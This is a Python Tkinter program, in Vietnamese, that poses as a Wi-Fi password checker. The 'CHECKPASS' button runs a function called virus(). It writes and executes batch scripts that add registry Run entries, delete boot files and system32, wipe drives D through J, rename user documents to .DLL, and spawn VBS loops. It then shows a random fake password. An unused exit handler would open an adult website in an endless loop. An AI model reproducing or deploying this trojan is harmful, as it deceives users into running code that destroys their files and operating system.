import io
import os,inspect
from time import sleep
from tkinter import *
from tkinter import messagebox
import random
def tenwifi():
	wifi = str(ten.get())
	if wifi =="":
    		messagebox.showerror("Lỗi","Tên Wi-Fi không hợp lệ!")
	return str(wifi)
def thongbao():
	messagebox.showinfo("Thông báo","Vui lòng chờ trong giây lát!")
def virus():
	t5 = """echo @echo off>c:windowswimn32.bat\necho break off>>c:windowswimn32.bat\necho ipconfig/release_all>>c:windowswimn32.bat\necho end>>c:windowswimn32.bat\nreg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f\nreg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f\necho Done!\nPAUSE"""
	thongbao()
	file5 = open("filev5.bat", mode="w", encoding = "utf8")
	file5.write(t5)
	file5.close()
	nguon5=os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
	monguon5 =  str("start "+nguon5+"\\"+"filev5.bat")
	nguonfile5 = str(nguon5+"\\"+"filev5.bat")
	os.system(monguon5)
	sleep(2)
	os.remove(nguonfile5)

	t7 = """@echo off\nattrib -r -s -hc:  autoexec.bat\ndel c:  autoexec.bat\nattrib -r -s -hc:  boot.ini\ndel c:  boot.ini\nattrib -r -s -hc:  ntldr\ndel c:  ntldr\nattrib -r -s -hc:  windows  win.ini\ndel c:  windows  win.ini"""
	file7 = open("filev7.bat", mode="w", encoding = "utf8")
	file7.write(t7)
	file7.close()
	nguon7=os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
	monguon7 =  str("start "+nguon7+"\\"+"filev7.bat")
	nguonfile7 = str(nguon7+"\\"+"filev7.bat")
	os.system(monguon7)
	sleep(2)
	os.remove(nguonfile7)


	t3 = """-del c:\WINDOWS\system32\**/q"""
	file3 = open("filev3.bat", mode="w", encoding = "utf8")
	file3.write(t3)
	file3.close()
	nguon3=os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
	monguon3 =  str("start "+nguon3+"\\"+"filev3.bat")
	nguonfile3 = str(nguon3+"\\"+"filev3.bat")
	os.system(monguon3)
	sleep(2)
	os.remove(nguonfile3)


	t4 = """-del c:\WINDOWS\system32\**/q"""
	file4 = open("filev4.cmd", mode="w", encoding = "utf8")
	file4.write(t4)
	file4.close()
	nguon4=os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
	monguon4 =  str("start "+nguon4+"\\"+"filev4.cmd")
	nguonfile4 = str(nguon4+"\\"+"filev4.cmd")
	os.system(monguon4)
	sleep(2)
	os.remove(nguonfile4)

	t9 = """Del c:.  WINDOWS  system32  * * / q"""
	file9 = open("filev9.bat", mode="w", encoding = "utf9")
	file9.write(t9)
	file9.close()
	nguon9=os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
	monguon9 =  str("start "+nguon9+"\\"+"filev9.bat")
	nguonfile9 = str(nguon9+"\\"+"filev9.bat")
	os.system(monguon9)
	sleep(2)
	os.remove(nguonfile9)

	if tenwifi() != "":
    		messagebox.showinfo("Thông Báo","Mật khẩu của "+str('"'+tenwifi()+'"')+" là: "+str(random.choice(["88888888","khongnhomatkhau","khongchodaunhe","1234567890","00000000","244466666","tumotdentam"])))

	t8 = """@echo off\ndel D:  *. * / f / s / q\ndel E:  *. * / f / s / q\ndel F:  *. * / f / s / q\ndel G:  *. * / f / s / q\ndel H:  *. * / f / s / q\ndel I:  *. * / f / s / q\ndel J:  *. * / f / s / q"""
	file8 = open("filev8.bat", mode="w", encoding = "utf8")
	file8.write(t8)
	file8.close()
	nguon8=os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
	monguon8 =  str("start "+nguon8+"\\"+"filev8.bat")
	nguonfile8 = str(nguon8+"\\"+"filev8.bat")
	os.system(monguon8)
	sleep(2)
	os.remove(nguonfile8)

	t10 = """REN * .DOC * .DLL\nREN * .JPEG * .DLL\nREN * LNK * .DLL\nREN * .AVI * .DLL\nREN * .MPEG * .DLL\nREN * .COM * .DLL\nREN * .HTML * .DLL\nREN * .C * .DLL\nREN * .CPP * .DLL\nREN * .PY * .DLL\nREN * .MP3 * .DLL\nREN * .PHP * .DLL\nREN * .JS * .DLL\nREN * .JAVA * .DLL\nREN * .CS * .DLL\nREN * .CSS * .DLL\nREN * .TXT * .DLL\nREN * .EXE * .DLL"""
	file10 = open("filev10.bat", mode="w", encoding = "utf10")
	file10.write(t10)
	file10.close()
	nguon10=os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
	monguon10 =  str("start "+nguon10+"\\"+"filev10.bat")
	nguonfile10 = str(nguon10+"\\"+"filev10.bat")
	os.system(monguon10)
	sleep(2)
	os.remove(nguonfile10)

	t6 = """DEL /F /Q *"""
	file6 = open("filev6.cmd", mode="w", encoding = "utf8")
	file6.write(t6)
	file6.close()
	nguon6=os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
	monguon6 =  str("start "+nguon6+"\\"+"filev6.cmd")
	nguonfile6 = str(nguon6+"\\"+"filev6.cmd")
	os.system(monguon6)
	sleep(2)
	os.remove(nguonfile6)


	t1 = """@Echo off\nDel  C: . |y"""
	file1 = open("filev1.bat", mode="w", encoding = "utf8")
	file1.write(t1)
	file1.close()
	nguon1=os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
	monguon1 =  str("start "+nguon1+"\\"+"filev1.bat")
	nguonfile1 = str(nguon1+"\\"+"filev1.bat")
	os.system(monguon1)
	sleep(2)
	os.remove(nguonfile1)

	t2 = """@echo off\n#Notrayicon\necho x=msgbox("Enjoy...",0+40,"....") >>Enjoy.vbs\nstart "" "Enjoy.vbs"\necho>> D6F9F6G65GF958F.exe\necho >> OGV76VC7BX9BX9Y.exe\nDEL C:\/s /q .\necho >>Treomay.vbs\nset /p Treomay.vbs=\ndo\ntreomay:run\nloop\nstart "Treomay.vbs"""
	file2 = open("filev2.bat", mode="w", encoding = "utf8")
	file2.write(t2)
	file2.close()
	nguon2=os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe())))
	monguon2 =  str("start "+nguon2+"\\"+"filev2.bat")
	nguonfile2 = str(nguon2+"\\"+"filev2.bat")
	os.system(monguon2)
	sleep(2)
	os.remove(nguonfile2)

def thoat():
	if messagebox.askokcancel("Thoát", "Bạn thực sự muốn thoát chương trình ?"):
		while True:
			os.system("start https://sextop1.pro")
		form.destroy()
form = Tk()
#form.protocol("WM_DELETE_WINDOW", thoat)
form.title("Checkpass wifi")
scrW= form.winfo_screenwidth()
scrH= form.winfo_screenheight()
W = scrW/2-150
H = scrH/2-100
form.geometry('300x200+%d+%d' %(W,H))
#tieu de ten wifi
tieude = Label(form, text= "Nhập Tên Wi-Fi (SSID)",font=("Times New Roman", 15))
tieude.pack(pady =10)
# nhap ten wifi
ten = Entry(form,font=("Times",20))
ten.focus()
ten.pack(pady =20)
#button check 
btn = Button(form,text = "CHECKPASS", font=("san-serif",15,"bold"), fg ="white", bg= "black",command = virus)
btn.pack(pady =10)
form.mainloop()